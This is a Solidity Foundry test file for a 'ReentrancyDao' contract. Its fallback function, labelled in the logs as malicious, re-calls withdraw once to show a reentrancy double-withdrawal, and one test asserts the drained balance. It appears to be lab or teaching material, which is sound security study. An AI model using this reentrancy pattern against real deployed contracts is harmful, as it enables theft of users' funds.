//@author: gacwr.org
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/ReentrancyDao.sol";
import "forge-std/console2.sol";
import "forge-std/Vm.sol";

contract ReentrancyDaoTest is Test {

    ReentrancyDao dao;

    bool haveIBeenCalled;

    function setUp() public {
        dao = new ReentrancyDao();
        haveIBeenCalled = false; // this allows for us to reenter one time
    }

    fallback() external payable {
        console.log("Test Contract Balance: ", address(this).balance);
        console.log("victim dao invoked malicious fallback");

        if (haveIBeenCalled == false){
            console.log("haveIBeenCalled WAS FALSE, REENTERING");
            haveIBeenCalled = true;
            dao.withdraw(msg.value);
        }else{
            console.log("haveIBeenCalled WAS TRUE, DONT REENTER");
        }

    }

    function testDonate() public {
        console.log("Test Contract Balance Before Donate: ", address(this).balance);
        console.log("Dao Balance Before Donate: ", address(dao).balance);
        dao.donate{value: 10}( address(this) );
        console.log("Test Contract Balance After Donate:  ", address(this).balance);
        console.log("Dao Balance After Donate: ", address(dao).balance);
        assertTrue(true);
    }

    function testOverDonate() public {
        // testing
        dao.donate{value: 700}( address(this) );

        uint startingBalance = dao.queryCredit(address(this));
        console.log("Test Over Donate, starting balance: %s", startingBalance);
        console.log("Test Contract Balance Before Donate: %s", address(this).balance);
        console.log("Dao Balance Before Donate: ", address(dao).balance);
        
        dao.donate{value: 50}( address(this) );
        dao.donate{value: 50}( address(this) );
        
        console.log("Test Contract Balance After Donate, Before Withdraw: %s ", address(this).balance);
        console.log("Dao Balance After Donate, Before Withdraw: ", address(dao).balance);
        
        uint endingBalance = dao.queryCredit(address(this));
        console.log("Test Over Donate, ending balance: %s", endingBalance);
        assertEq(endingBalance, 800);

        // reenter once
        if (haveIBeenCalled == false){
            console.log("haveIBeenCalled WAS FALSE, REENTERING");
            // haveIBeenCalled = true;
            dao.withdraw(100);
            console.log("Test Contract Balance After Donate, After Withdraw: %s ", address(this).balance);
            console.log("Dao Balance After Donate, After Withdraw: ", address(dao).balance);
        }else{
            console.log("haveIBeenCalled WAS TRUE, DONT REENTER");
        }

        uint finalBalance = dao.queryCredit(address(this));
        assertEq(finalBalance, 600);

    }

    function testDonateWithdraw() public {
        dao.donate{value: 2}( address(this) );
        dao.withdraw(1);
        assertTrue(true);
    }
}
